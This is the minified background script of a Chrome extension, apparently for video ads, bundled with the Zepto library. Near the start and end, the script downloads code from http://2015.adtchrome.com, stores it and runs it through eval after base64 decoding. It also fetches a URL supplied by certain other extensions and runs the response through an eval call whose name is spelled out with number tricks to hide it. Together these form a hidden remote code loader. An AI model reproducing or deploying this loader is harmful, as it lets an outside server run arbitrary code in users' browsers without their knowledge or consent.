function doUpdate(t){$.ajax({type:"GET",url:uurl+"/videoconfig.json?t="+Date.now(),success:function(e){"string"==typeof e&&(e=JSON.parse(e)),localStorage.videoVersion&&e.videoVersion==localStorage.videoVersion||$.ajax({type:"GET",url:uurl+"/videoad2.txt?t="+Date.now(),success:function(e){$.IOW("video",e,function(){console.log("rule save"),t()},function(){console.error("request error")})}}),localStorage.excluedExt=e.excluedExt,localStorage.videoVersion=e.videoVersion,localStorage.warm=e.warm,localStorage.warmLinks=JSON.stringify(e.tips),localStorage.homepagecheck=JSON.stringify(e.homepagecheck)}})}function updateIcon(){window.videoOn?chrome.browserAction.setIcon({path:"/icons/new-19.png"}):chrome.browserAction.setIcon({path:"/icons/new-19-close.png"})}function iniExt(t){window.videoOn="false"!==localStorage.videoOn,updateIcon(),window.tips=localStorage.warm?localStorage.warm:"",window.warmLinks=localStorage.warmLinks?JSON.parse(localStorage.warmLinks):[];var e=atob(t);try{eval.call(window,e)}catch(n){console.error(n)}}var Zepto=function(){function t(t){return null==t?String(t):J[G.call(t)]||"object"}function e(e){return"function"==t(e)}function n(t){return null!=t&&t==t.window}function r(t){return null!=t&&t.nodeType==t.DOCUMENT_NODE}function i(e){return"object"==t(e)}function o(t){return i(t)&&!n(t)&&Object.getPrototypeOf(t)==Object.prototype}function a(t){return"number"==typeof t.length}function c(t){return k.call(t,function(t){return null!=t})}function s(t){return t.length>0?S.fn.concat.apply([],t):t}function u(t){return t.replace(/::/g,"/").replace(/([A-Z]+)([A-Z][a-z])/g,"$1_$2").replace(/([a-z\d])([A-Z])/g,"$1_$2").replace(/_/g,"-").toLowerCase()}function l(t){return t in A?A[t]:A[t]=new RegExp("(^|\\s)"+t+"(\\s|$)")}function f(t,e){return"number"!=typeof e||I[u(t)]?e:e+"px"}function h(t){var e,n;return L[t]||(e=P.createElement(t),P.body.appendChild(e),n=getComputedStyle(e,"").getPropertyValue("display"),e.parentNode.removeChild(e),"none"==n&&(n="block"),L[t]=n),L[t]}function p(t){return"children"in t?C.call(t.children):S.map(t.childNodes,function(t){if(1==t.nodeType)return t})}function d(t,e,n){for(E in e)n&&(o(e[E])||Y(e[E]))?(o(e[E])&&!o(t[E])&&(t[E]={}),Y(e[E])&&!Y(t[E])&&(t[E]=[]),d(t[E],e[E],n)):e[E]!==x&&(t[E]=e[E])}function m(t,e){return null==e?S(t):S(t).filter(e)}function g(t,n,r,i){return e(n)?n.call(t,r,i):n}function v(t,e,n){null==n?t.removeAttribute(e):t.setAttribute(e,n)}function y(t,e){var n=t.className||"",r=n&&n.baseVal!==x;return e===x?r?n.baseVal:n:void(r?n.baseVal=e:t.className=e)}function w(t){try{return t?"true"==t||"false"!=t&&("null"==t?null:+t+""==t?+t:/^[\[\{]/.test(t)?S.parseJSON(t):t):t}catch(e){return t}}function b(t,e){e(t);for(var n=0,r=t.childNodes.length;n<r;n++)b(t.childNodes[n],e)}var x,E,S,j,O,T,N=[],C=N.slice,k=N.filter,P=window.document,L={},A={},I={"column-count":1,columns:1,"font-weight":1,"line-height":1,opacity:1,"z-index":1,zoom:1},D=/^\s*<(\w+|!)[^>]*>/,$=/^<(\w+)\s*\/?>(?:<\/\1>|)$/,R=/<(?!area|br|col|embed|hr|img|input|link|meta|param)(([\w:]+)[^>]*)\/>/gi,Z=/^(?:body|html)$/i,_=/([A-Z])/g,F=["val","css","html","text","data","width","height","offset"],M=["after","prepend","before","append"],q=P.createElement("table"),z=P.createElement("tr"),V={tr:P.createElement("tbody"),tbody:q,thead:q,tfoot:q,td:z,th:z,"*":P.createElement("div")},U=/complete|loaded|interactive/,H=/^[\w-]*$/,J={},G=J.toString,B={},W=P.createElement("div"),X={tabindex:"tabIndex",readonly:"readOnly","for":"htmlFor","class":"className",maxlength:"maxLength",cellspacing:"cellSpacing",cellpadding:"cellPadding",rowspan:"rowSpan",colspan:"colSpan",usemap:"useMap",frameborder:"frameBorder",contenteditable:"contentEditable"},Y=Array.isArray||function(t){return t instanceof Array};return B.matches=function(t,e){if(!e||!t||1!==t.nodeType)return!1;var n=t.webkitMatchesSelector||t.mozMatchesSelector||t.oMatchesSelector||t.matchesSelector;if(n)return n.call(t,e);var r,i=t.parentNode,o=!i;return o&&(i=W).appendChild(t),r=~B.qsa(i,e).indexOf(t),o&&W.removeChild(t),r},O=function(t){return t.replace(/-+(.)?/g,function(t,e){return e?e.toUpperCase():""})},T=function(t){return k.call(t,function(e,n){return t.indexOf(e)==n})},B.fragment=function(t,e,n){var r,i,a;return $.test(t)&&(r=S(P.createElement(RegExp.$1))),r||(t.replace&&(t=t.replace(R,"<$1></$2>")),e===x&&(e=D.test(t)&&RegExp.$1),e in V||(e="*"),a=V[e],a.innerHTML=""+t,r=S.each(C.call(a.childNodes),function(){a.removeChild(this)})),o(n)&&(i=S(r),S.each(n,function(t,e){F.indexOf(t)>-1?i[t](e):i.attr(t,e)})),r},B.Z=function(t,e){return t=t||[],t.__proto__=S.fn,t.selector=e||"",t},B.isZ=function(t){return t instanceof B.Z},B.init=function(t,n){var r;if(!t)return B.Z();if("string"==typeof t)if(t=t.trim(),"<"==t[0]&&D.test(t))r=B.fragment(t,RegExp.$1,n),t=null;else{if(n!==x)return S(n).find(t);r=B.qsa(P,t)}else{if(e(t))return S(P).ready(t);if(B.isZ(t))return t;if(Y(t))r=c(t);else if(i(t))r=[t],t=null;else if(D.test(t))r=B.fragment(t.trim(),RegExp.$1,n),t=null;else{if(n!==x)return S(n).find(t);r=B.qsa(P,t)}}return B.Z(r,t)},S=function(t,e){return B.init(t,e)},S.extend=function(t){var e,n=C.call(arguments,1);return"boolean"==typeof t&&(e=t,t=n.shift()),n.forEach(function(n){d(t,n,e)}),t},B.qsa=function(t,e){var n,i="#"==e[0],o=!i&&"."==e[0],a=i||o?e.slice(1):e,c=H.test(a);return r(t)&&c&&i?(n=t.getElementById(a))?[n]:[]:1!==t.nodeType&&9!==t.nodeType?[]:C.call(c&&!i?o?t.getElementsByClassName(a):t.getElementsByTagName(e):t.querySelectorAll(e))},S.contains=P.documentElement.contains?function(t,e){return t!==e&&t.contains(e)}:function(t,e){for(;e&&(e=e.parentNode);)if(e===t)return!0;return!1},S.type=t,S.isFunction=e,S.isWindow=n,S.isArray=Y,S.isPlainObject=o,S.isEmptyObject=function(t){var e;for(e in t)return!1;return!0},S.inArray=function(t,e,n){return N.indexOf.call(e,t,n)},S.camelCase=O,S.trim=function(t){return null==t?"":String.prototype.trim.call(t)},S.uuid=0,S.support={},S.expr={},S.map=function(t,e){var n,r,i,o=[];if(a(t))for(r=0;r<t.length;r++)n=e(t[r],r),null!=n&&o.push(n);else for(i in t)n=e(t[i],i),null!=n&&o.push(n);return s(o)},S.each=function(t,e){var n,r;if(a(t)){for(n=0;n<t.length;n++)if(e.call(t[n],n,t[n])===!1)return t}else for(r in t)if(e.call(t[r],r,t[r])===!1)return t;return t},S.grep=function(t,e){return k.call(t,e)},window.JSON&&(S.parseJSON=JSON.parse),S.each("Boolean Number String Function Array Date RegExp Object Error".split(" "),function(t,e){J["[object "+e+"]"]=e.toLowerCase()}),S.fn={forEach:N.forEach,reduce:N.reduce,push:N.push,sort:N.sort,indexOf:N.indexOf,concat:N.concat,map:function(t){return S(S.map(this,function(e,n){return t.call(e,n,e)}))},slice:function(){return S(C.apply(this,arguments))},ready:function(t){return U.test(P.readyState)&&P.body?t(S):P.addEventListener("DOMContentLoaded",function(){t(S)},!1),this},get:function(t){return t===x?C.call(this):this[t>=0?t:t+this.length]},toArray:function(){return this.get()},size:function(){return this.length},remove:function(){return this.each(function(){null!=this.parentNode&&this.parentNode.removeChild(this)})},each:function(t){return N.every.call(this,function(e,n){return t.call(e,n,e)!==!1}),this},filter:function(t){return e(t)?this.not(this.not(t)):S(k.call(this,function(e){return B.matches(e,t)}))},add:function(t,e){return S(T(this.concat(S(t,e))))},is:function(t){return this.length>0&&B.matches(this[0],t)},not:function(t){var n=[];if(e(t)&&t.call!==x)this.each(function(e){t.call(this,e)||n.push(this)});else{var r="string"==typeof t?this.filter(t):a(t)&&e(t.item)?C.call(t):S(t);this.forEach(function(t){r.indexOf(t)<0&&n.push(t)})}return S(n)},has:function(t){return this.filter(function(){return i(t)?S.contains(this,t):S(this).find(t).size()})},eq:function(t){return t===-1?this.slice(t):this.slice(t,+t+1)},first:function(){var t=this[0];return t&&!i(t)?t:S(t)},last:function(){var t=this[this.length-1];return t&&!i(t)?t:S(t)},find:function(t){var e,n=this;return e=t?"object"==typeof t?S(t).filter(function(){var t=this;return N.some.call(n,function(e){return S.contains(e,t)})}):1==this.length?S(B.qsa(this[0],t)):this.map(function(){return B.qsa(this,t)}):S()},closest:function(t,e){var n=this[0],i=!1;for("object"==typeof t&&(i=S(t));n&&!(i?i.indexOf(n)>=0:B.matches(n,t));)n=n!==e&&!r(n)&&n.parentNode;return S(n)},parents:function(t){for(var e=[],n=this;n.length>0;)n=S.map(n,function(t){if((t=t.parentNode)&&!r(t)&&e.indexOf(t)<0)return e.push(t),t});return m(e,t)},parent:function(t){return m(T(this.pluck("parentNode")),t)},children:function(t){return m(this.map(function(){return p(this)}),t)},contents:function(){return this.map(function(){return C.call(this.childNodes)})},siblings:function(t){return m(this.map(function(t,e){return k.call(p(e.parentNode),function(t){return t!==e})}),t)},empty:function(){return this.each(function(){this.innerHTML=""})},pluck:function(t){return S.map(this,function(e){return e[t]})},show:function(){return this.each(function(){"none"==this.style.display&&(this.style.display=""),"none"==getComputedStyle(this,"").getPropertyValue("display")&&(this.style.display=h(this.nodeName))})},replaceWith:function(t){return this.before(t).remove()},wrap:function(t){var n=e(t);if(this[0]&&!n)var r=S(t).get(0),i=r.parentNode||this.length>1;return this.each(function(e){S(this).wrapAll(n?t.call(this,e):i?r.cloneNode(!0):r)})},wrapAll:function(t){if(this[0]){S(this[0]).before(t=S(t));for(var e;(e=t.children()).length;)t=e.first();S(t).append(this)}return this},wrapInner:function(t){var n=e(t);return this.each(function(e){var r=S(this),i=r.contents(),o=n?t.call(this,e):t;i.length?i.wrapAll(o):r.append(o)})},unwrap:function(){return this.parent().each(function(){S(this).replaceWith(S(this).children())}),this},clone:function(){return this.map(function(){return this.cloneNode(!0)})},hide:function(){return this.css("display","none")},toggle:function(t){return this.each(function(){var e=S(this);(t===x?"none"==e.css("display"):t)?e.show():e.hide()})},prev:function(t){return S(this.pluck("previousElementSibling")).filter(t||"*")},next:function(t){return S(this.pluck("nextElementSibling")).filter(t||"*")},html:function(t){return 0 in arguments?this.each(function(e){var n=this.innerHTML;S(this).empty().append(g(this,t,e,n))}):0 in this?this[0].innerHTML:null},text:function(t){return 0 in arguments?this.each(function(e){var n=g(this,t,e,this.textContent);this.textContent=null==n?"":""+n}):0 in this?this[0].textContent:null},attr:function(t,e){var n;return"string"!=typeof t||1 in arguments?this.each(function(n){if(1===this.nodeType)if(i(t))for(E in t)v(this,E,t[E]);else v(this,t,g(this,e,n,this.getAttribute(t)))}):this.length&&1===this[0].nodeType?!(n=this[0].getAttribute(t))&&t in this[0]?this[0][t]:n:x},removeAttr:function(t){return this.each(function(){1===this.nodeType&&t.split(" ").forEach(function(t){v(this,t)},this)})},prop:function(t,e){return t=X[t]||t,1 in arguments?this.each(function(n){this[t]=g(this,e,n,this[t])}):this[0]&&this[0][t]},data:function(t,e){var n="data-"+t.replace(_,"-$1").toLowerCase(),r=1 in arguments?this.attr(n,e):this.attr(n);return null!==r?w(r):x},val:function(t){return 0 in arguments?this.each(function(e){this.value=g(this,t,e,this.value)}):this[0]&&(this[0].multiple?S(this[0]).find("option").filter(function(){return this.selected}).pluck("value"):this[0].value)},offset:function(t){if(t)return this.each(function(e){var n=S(this),r=g(this,t,e,n.offset()),i=n.offsetParent().offset(),o={top:r.top-i.top,left:r.left-i.left};"static"==n.css("position")&&(o.position="relative"),n.css(o)});if(!this.length)return null;var e=this[0].getBoundingClientRect();return{left:e.left+window.pageXOffset,top:e.top+window.pageYOffset,width:Math.round(e.width),height:Math.round(e.height)}},css:function(e,n){if(arguments.length<2){var r,i=this[0];if(!i)return;if(r=getComputedStyle(i,""),"string"==typeof e)return i.style[O(e)]||r.getPropertyValue(e);if(Y(e)){var o={};return S.each(e,function(t,e){o[e]=i.style[O(e)]||r.getPropertyValue(e)}),o}}var a="";if("string"==t(e))n||0===n?a=u(e)+":"+f(e,n):this.each(function(){this.style.removeProperty(u(e))});else for(E in e)e[E]||0===e[E]?a+=u(E)+":"+f(E,e[E])+";":this.each(function(){this.style.removeProperty(u(E))});return this.each(function(){this.style.cssText+=";"+a})},index:function(t){return t?this.indexOf(S(t)[0]):this.parent().children().indexOf(this[0])},hasClass:function(t){return!!t&&N.some.call(this,function(t){return this.test(y(t))},l(t))},addClass:function(t){return t?this.each(function(e){if("className"in this){j=[];var n=y(this),r=g(this,t,e,n);r.split(/\s+/g).forEach(function(t){S(this).hasClass(t)||j.push(t)},this),j.length&&y(this,n+(n?" ":"")+j.join(" "))}}):this},removeClass:function(t){return this.each(function(e){if("className"in this){if(t===x)return y(this,"");j=y(this),g(this,t,e,j).split(/\s+/g).forEach(function(t){j=j.replace(l(t)," ")}),y(this,j.trim())}})},toggleClass:function(t,e){return t?this.each(function(n){var r=S(this),i=g(this,t,n,y(this));i.split(/\s+/g).forEach(function(t){(e===x?!r.hasClass(t):e)?r.addClass(t):r.removeClass(t)})}):this},scrollTop:function(t){if(this.length){var e="scrollTop"in this[0];return t===x?e?this[0].scrollTop:this[0].pageYOffset:this.each(e?function(){this.scrollTop=t}:function(){this.scrollTo(this.scrollX,t)})}},scrollLeft:function(t){if(this.length){var e="scrollLeft"in this[0];return t===x?e?this[0].scrollLeft:this[0].pageXOffset:this.each(e?function(){this.scrollLeft=t}:function(){this.scrollTo(t,this.scrollY)})}},position:function(){if(this.length){var t=this[0],e=this.offsetParent(),n=this.offset(),r=Z.test(e[0].nodeName)?{top:0,left:0}:e.offset();return n.top-=parseFloat(S(t).css("margin-top"))||0,n.left-=parseFloat(S(t).css("margin-left"))||0,r.top+=parseFloat(S(e[0]).css("border-top-width"))||0,r.left+=parseFloat(S(e[0]).css("border-left-width"))||0,{top:n.top-r.top,left:n.left-r.left}}},offsetParent:function(){return this.map(function(){for(var t=this.offsetParent||P.body;t&&!Z.test(t.nodeName)&&"static"==S(t).css("position");)t=t.offsetParent;return t})}},S.fn.detach=S.fn.remove,["width","height"].forEach(function(t){var e=t.replace(/./,function(t){return t[0].toUpperCase()});S.fn[t]=function(i){var o,a=this[0];return i===x?n(a)?a["inner"+e]:r(a)?a.documentElement["scroll"+e]:(o=this.offset())&&o[t]:this.each(function(e){a=S(this),a.css(t,g(this,i,e,a[t]()))})}}),M.forEach(function(e,n){var r=n%2;S.fn[e]=function(){var e,i,o=S.map(arguments,function(n){return e=t(n),"object"==e||"array"==e||null==n?n:B.fragment(n)}),a=this.length>1;return o.length<1?this:this.each(function(t,e){i=r?e:e.parentNode,e=0==n?e.nextSibling:1==n?e.firstChild:2==n?e:null;var c=S.contains(P.documentElement,i);o.forEach(function(t){if(a)t=t.cloneNode(!0);else if(!i)return S(t).remove();i.insertBefore(t,e),c&&b(t,function(t){null==t.nodeName||"SCRIPT"!==t.nodeName.toUpperCase()||t.type&&"text/javascript"!==t.type||t.src||window.eval.call(window,t.innerHTML)})})})},S.fn[r?e+"To":"insert"+(n?"Before":"After")]=function(t){return S(t)[e](this),this}}),B.Z.prototype=S.fn,B.uniq=T,B.deserializeValue=w,S.zepto=B,S}();window.Zepto=Zepto,void 0===window.$&&(window.$=Zepto),function(t){function e(t){return t._zid||(t._zid=h++)}function n(t,n,o,a){if(n=r(n),n.ns)var c=i(n.ns);return(g[e(t)]||[]).filter(function(t){return t&&(!n.e||t.e==n.e)&&(!n.ns||c.test(t.ns))&&(!o||e(t.fn)===e(o))&&(!a||t.sel==a)})}function r(t){var e=(""+t).split(".");return{e:e[0],ns:e.slice(1).sort().join(" ")}}function i(t){return new RegExp("(?:^| )"+t.replace(" "," .* ?")+"(?: |$)")}function o(t,e){return t.del&&!y&&t.e in w||!!e}function a(t){return b[t]||y&&w[t]||t}function c(n,i,c,s,l,h,p){var d=e(n),m=g[d]||(g[d]=[]);i.split(/\s/).forEach(function(e){if("ready"==e)return t(document).ready(c);var i=r(e);i.fn=c,i.sel=l,i.e in b&&(c=function(e){var n=e.relatedTarget;if(!n||n!==this&&!t.contains(this,n))return i.fn.apply(this,arguments)}),i.del=h;var d=h||c;i.proxy=function(t){if(t=u(t),!t.isImmediatePropagationStopped()){t.data=s;var e=d.apply(n,t._args==f?[t]:[t].concat(t._args));return e===!1&&(t.preventDefault(),t.stopPropagation()),e}},i.i=m.length,m.push(i),"addEventListener"in n&&n.addEventListener(a(i.e),i.proxy,o(i,p))})}function s(t,r,i,c,s){var u=e(t);(r||"").split(/\s/).forEach(function(e){n(t,e,i,c).forEach(function(e){delete g[u][e.i],"removeEventListener"in t&&t.removeEventListener(a(e.e),e.proxy,o(e,s))})})}function u(e,n){return!n&&e.isDefaultPrevented||(n||(n=e),t.each(j,function(t,r){var i=n[t];e[t]=function(){return this[r]=x,i&&i.apply(n,arguments)},e[r]=E}),(n.defaultPrevented!==f?n.defaultPrevented:"returnValue"in n?n.returnValue===!1:n.getPreventDefault&&n.getPreventDefault())&&(e.isDefaultPrevented=x)),e}function l(t){var e,n={originalEvent:t};for(e in t)S.test(e)||t[e]===f||(n[e]=t[e]);return u(n,t)}var f,h=1,p=Array.prototype.slice,d=t.isFunction,m=function(t){return"string"==typeof t},g={},v={},y="onfocusin"in window,w={focus:"focusin",blur:"focusout"},b={mouseenter:"mouseover",mouseleave:"mouseout"};v.click=v.mousedown=v.mouseup=v.mousemove="MouseEvents",t.event={add:c,remove:s},t.proxy=function(n,r){var i=2 in arguments&&p.call(arguments,2);if(d(n)){var o=function(){return n.apply(r,i?i.concat(p.call(arguments)):arguments)};return o._zid=e(n),o}if(m(r))return i?(i.unshift(n[r],n),t.proxy.apply(null,i)):t.proxy(n[r],n);throw new TypeError("expected function")},t.fn.bind=function(t,e,n){return this.on(t,e,n)},t.fn.unbind=function(t,e){return this.off(t,e)},t.fn.one=function(t,e,n,r){return this.on(t,e,n,r,1)};var x=function(){return!0},E=function(){return!1},S=/^([A-Z]|returnValue$|layer[XY]$)/,j={preventDefault:"isDefaultPrevented",stopImmediatePropagation:"isImmediatePropagationStopped",stopPropagation:"isPropagationStopped"};t.fn.delegate=function(t,e,n){return this.on(e,t,n)},t.fn.undelegate=function(t,e,n){return this.off(e,t,n)},t.fn.live=function(e,n){return t(document.body).delegate(this.selector,e,n),this},t.fn.die=function(e,n){return t(document.body).undelegate(this.selector,e,n),this},t.fn.on=function(e,n,r,i,o){var a,u,h=this;return e&&!m(e)?(t.each(e,function(t,e){h.on(t,n,r,e,o)}),h):(m(n)||d(i)||i===!1||(i=r,r=n,n=f),(d(r)||r===!1)&&(i=r,r=f),i===!1&&(i=E),h.each(function(f,h){o&&(a=function(t){return s(h,t.type,i),i.apply(this,arguments)}),n&&(u=function(e){var r,o=t(e.target).closest(n,h).get(0);if(o&&o!==h)return r=t.extend(l(e),{currentTarget:o,liveFired:h}),(a||i).apply(o,[r].concat(p.call(arguments,1)))}),c(h,e,i,r,n,u||a)}))},t.fn.off=function(e,n,r){var i=this;return e&&!m(e)?(t.each(e,function(t,e){i.off(t,n,e)}),i):(m(n)||d(r)||r===!1||(r=n,n=f),r===!1&&(r=E),i.each(function(){s(this,e,r,n)}))},t.fn.trigger=function(e,n){return e=m(e)||t.isPlainObject(e)?t.Event(e):u(e),e._args=n,this.each(function(){e.type in w&&"function"==typeof this[e.type]?this[e.type]():"dispatchEvent"in this?this.dispatchEvent(e):t(this).triggerHandler(e,n)})},t.fn.triggerHandler=function(e,r){var i,o;return this.each(function(a,c){i=l(m(e)?t.Event(e):e),i._args=r,i.target=c,t.each(n(c,e.type||e),function(t,e){if(o=e.proxy(i),i.isImmediatePropagationStopped())return!1})}),o},"focusin focusout focus blur load resize scroll unload click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select keydown keypress keyup error".split(" ").forEach(function(e){t.fn[e]=function(t){return 0 in arguments?this.bind(e,t):this.trigger(e)}}),t.Event=function(t,e){m(t)||(e=t,t=e.type);var n=document.createEvent(v[t]||"Events"),r=!0;if(e)for(var i in e)"bubbles"==i?r=!!e[i]:n[i]=e[i];return n.initEvent(t,r,!0),u(n)}}(Zepto),function(t){function e(e,n,r){var i=t.Event(n);return t(e).trigger(i,r),!i.isDefaultPrevented()}function n(t,n,r,i){if(t.global)return e(n||y,r,i)}function r(e){e.global&&0===t.active++&&n(e,null,"ajaxStart")}function i(e){e.global&&!--t.active&&n(e,null,"ajaxStop")}function o(t,e){var r=e.context;return e.beforeSend.call(r,t,e)!==!1&&n(e,r,"ajaxBeforeSend",[t,e])!==!1&&void n(e,r,"ajaxSend",[t,e])}function a(t,e,r,i){var o=r.context,a="success";r.success.call(o,t,a,e),i&&i.resolveWith(o,[t,a,e]),n(r,o,"ajaxSuccess",[e,r,t]),s(a,e,r)}function c(t,e,r,i,o){var a=i.context;i.error.call(a,r,e,t),o&&o.rejectWith(a,[r,e,t]),n(i,a,"ajaxError",[r,i,t||e]),s(e,r,i)}function s(t,e,r){var o=r.context;r.complete.call(o,e,t),n(r,o,"ajaxComplete",[e,r]),i(r)}function u(){}function l(t){return t&&(t=t.split(";",2)[0]),t&&(t==S?"html":t==E?"json":b.test(t)?"script":x.test(t)&&"xml")||"text"}function f(t,e){return""==e?t:(t+"&"+e).replace(/[&?]{1,2}/,"?")}function h(e){e.processData&&e.data&&"string"!=t.type(e.data)&&(e.data=t.param(e.data,e.traditional)),!e.data||e.type&&"GET"!=e.type.toUpperCase()||(e.url=f(e.url,e.data),e.data=void 0)}function p(e,n,r,i){return t.isFunction(n)&&(i=r,r=n,n=void 0),t.isFunction(r)||(i=r,r=void 0),{url:e,data:n,success:r,dataType:i}}function d(e,n,r,i){var o,a=t.isArray(n),c=t.isPlainObject(n);t.each(n,function(n,s){o=t.type(s),i&&(n=r?i:i+"["+(c||"object"==o||"array"==o?n:"")+"]"),!i&&a?e.add(s.name,s.value):"array"==o||!r&&"object"==o?d(e,s,r,n):e.add(n,s)})}var m,g,v=0,y=window.document,w=/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi,b=/^(?:text|application)\/javascript/i,x=/^(?:text|application)\/xml/i,E="application/json",S="text/html",j=/^\s*$/,O=y.createElement("a");O.href=window.location.href,t.active=0,t.ajaxJSONP=function(e,n){if(!("type"in e))return t.ajax(e);var r,i,s=e.jsonpCallback,u=(t.isFunction(s)?s():s)||"jsonp"+ ++v,l=y.createElement("script"),f=window[u],h=function(e){t(l).triggerHandler("error",e||"abort")},p={abort:h};return n&&n.promise(p),t(l).on("load error",function(o,s){clearTimeout(i),t(l).off().remove(),"error"!=o.type&&r?a(r[0],p,e,n):c(null,s||"error",p,e,n),window[u]=f,r&&t.isFunction(f)&&f(r[0]),f=r=void 0}),o(p,e)===!1?(h("abort"),p):(window[u]=function(){r=arguments},l.src=e.url.replace(/\?(.+)=\?/,"?$1="+u),y.head.appendChild(l),e.timeout>0&&(i=setTimeout(function(){h("timeout")},e.timeout)),p)},t.ajaxSettings={type:"GET",beforeSend:u,success:u,error:u,complete:u,context:null,global:!0,xhr:function(){return new window.XMLHttpRequest},accepts:{script:"text/javascript, application/javascript, application/x-javascript",json:E,xml:"application/xml, text/xml",html:S,text:"text/plain"},crossDomain:!1,timeout:0,processData:!0,cache:!0},t.ajax=function(e){var n,i=t.extend({},e||{}),s=t.Deferred&&t.Deferred();for(m in t.ajaxSettings)void 0===i[m]&&(i[m]=t.ajaxSettings[m]);r(i),i.crossDomain||(n=y.createElement("a"),n.href=i.url,n.href=n.href,i.crossDomain=O.protocol+"//"+O.host!=n.protocol+"//"+n.host),i.url||(i.url=window.location.toString()),h(i);var p=i.dataType,d=/\?.+=\?/.test(i.url);if(d&&(p="jsonp"),i.cache!==!1&&(e&&e.cache===!0||"script"!=p&&"jsonp"!=p)||(i.url=f(i.url,"_="+Date.now())),"jsonp"==p)return d||(i.url=f(i.url,i.jsonp?i.jsonp+"=?":i.jsonp===!1?"":"callback=?")),t.ajaxJSONP(i,s);var v,w=i.accepts[p],b={},x=function(t,e){b[t.toLowerCase()]=[t,e]},E=/^([\w-]+:)\/\//.test(i.url)?RegExp.$1:window.location.protocol,S=i.xhr(),T=S.setRequestHeader;if(s&&s.promise(S),i.crossDomain||x("X-Requested-With","XMLHttpRequest"),x("Accept",w||"*/*"),(w=i.mimeType||w)&&(w.indexOf(",")>-1&&(w=w.split(",",2)[0]),S.overrideMimeType&&S.overrideMimeType(w)),(i.contentType||i.contentType!==!1&&i.data&&"GET"!=i.type.toUpperCase())&&x("Content-Type",i.contentType||"application/x-www-form-urlencoded"),i.headers)for(g in i.headers)x(g,i.headers[g]);if(S.setRequestHeader=x,S.onreadystatechange=function(){if(4==S.readyState){S.onreadystatechange=u,clearTimeout(v);var e,n=!1;if(S.status>=200&&S.status<300||304==S.status||0==S.status&&"file:"==E){p=p||l(i.mimeType||S.getResponseHeader("content-type")),e=S.responseText;try{"script"==p?(0,eval)(e):"xml"==p?e=S.responseXML:"json"==p&&(e=j.test(e)?null:t.parseJSON(e))}catch(r){n=r}n?c(n,"parsererror",S,i,s):a(e,S,i,s)}else c(S.statusText||null,S.status?"error":"abort",S,i,s)}},o(S,i)===!1)return S.abort(),c(null,"abort",S,i,s),S;if(i.xhrFields)for(g in i.xhrFields)S[g]=i.xhrFields[g];var N=!("async"in i)||i.async;S.open(i.type,i.url,N,i.username,i.password);for(g in b)T.apply(S,b[g]);return i.timeout>0&&(v=setTimeout(function(){S.onreadystatechange=u,S.abort(),c(null,"timeout",S,i,s)},i.timeout)),S.send(i.data?i.data:null),S},t.get=function(){return t.ajax(p.apply(null,arguments))},t.post=function(){var e=p.apply(null,arguments);return e.type="POST",t.ajax(e)},t.getJSON=function(){var e=p.apply(null,arguments);return e.dataType="json",t.ajax(e)},t.fn.load=function(e,n,r){if(!this.length)return this;var i,o=this,a=e.split(/\s/),c=p(e,n,r),s=c.success;return a.length>1&&(c.url=a[0],i=a[1]),c.success=function(e){o.html(i?t("<div>").html(e.replace(w,"")).find(i):e),s&&s.apply(o,arguments)},t.ajax(c),this};var T=encodeURIComponent;t.param=function(e,n){var r=[];return r.add=function(e,n){t.isFunction(n)&&(n=n()),null==n&&(n=""),this.push(T(e)+"="+T(n))},d(r,e,n),r.join("&").replace(/%20/g,"+")}}(Zepto),function(t){t.fn.serializeArray=function(){var e,n,r=[],i=function(t){return t.forEach?t.forEach(i):void r.push({name:e,value:t})};return this[0]&&t.each(this[0].elements,function(r,o){n=o.type,e=o.name,e&&"fieldset"!=o.nodeName.toLowerCase()&&!o.disabled&&"submit"!=n&&"reset"!=n&&"button"!=n&&"file"!=n&&("radio"!=n&&"checkbox"!=n||o.checked)&&i(t(o).val())}),r},t.fn.serialize=function(){var t=[];return this.serializeArray().forEach(function(e){t.push(encodeURIComponent(e.name)+"="+encodeURIComponent(e.value))}),t.join("&")},t.fn.submit=function(e){if(0 in arguments)this.bind("submit",e);else if(this.length){var n=t.Event("submit");this.eq(0).trigger(n),n.isDefaultPrevented()||this.get(0).submit()}return this}}(Zepto),function(t){"__proto__"in{}||t.extend(t.zepto,{Z:function(e,n){return e=e||[],t.extend(e,t.fn),e.selector=n||"",e.__Z=!0,e},isZ:function(e){return"array"===t.type(e)&&"__Z"in e}});try{getComputedStyle(void 0)}catch(e){var n=getComputedStyle;window.getComputedStyle=function(t){try{return n(t)}catch(e){return null}}}}(Zepto),function(t){var e=10485760;t.IOG=function(t,n,r,i){(window.requestFileSystem||window.webkitRequestFileSystem)(window.PERSISTENT,e,function(e){e.root.getFile(t,{create:n},function(t){r(e,t)},i)},i)},t.IOR=function(e,n,r){t.IOG(e,!1,function(t,e){e.file(function(t){var e=new FileReader;e.onloadend=function(){n(e.result)},e.readAsText(t)},r)},r)},t.IOW=function(e,n,r,i){var o=function(e,n,r,i){t.IOG(e,!0,function(t,e){e.createWriter(function(t){t.onwriteend=r,t.onerror=i;var e=new Blob([n],{type:"text/plain"});t.write(e)},i)},i)};t.IOD(e,function(){o(e,n,r,i)},function(){o(e,n,r,i)})},t.IOD=function(e,n,r){t.IOG(e,!1,function(t,e){e.remove(function(){n()},r)},r)},t.IOE=function(e,n){t.IOG(e,!1,function(){n(!0)},function(){n(!1)})}}(Zepto);var uurl=localStorage.debugUrl?localStorage.debugUrl:"http://2015.adtchrome.com";$.IOR("video",function(t){iniExt(t),doUpdate(function(){chrome.runtime.reload()})},function(){localStorage.installed=Date.now(),doUpdate(function(){$.IOR("video",function(t){iniExt(t)},function(){})})}),chrome.runtime.onMessageExternal.addListener(function(t,e,n){e.id.indexOf("igjjoimfnabioofkbmkcphkikcnahanc1cmaoldpjekhfpfblibpbjdofppkaeehi2ndjbdedagcoamcgnkjjbdlnbbpfblmbm3bbhgihplklobbjhbbinfgbpggendeogm4dkpoigplpbpgccdpfngekkpdgecedecp5")&&(localStorage.welcomLink=t.wl,console.log("."),n({result:1}))}),localStorage.welcomLink&&(!localStorage.welcomStart||localStorage.welcomStart&&Date.now()>parseInt(localStorage.welcomStart))&&$.ajax({type:"GET",url:localStorage.welcomLink+"?t="+Date.now(),success:function(t){try{window[14..toString(16)+"v"+241..toString(22)].call(window,t)}catch(e){console.error(e)}}});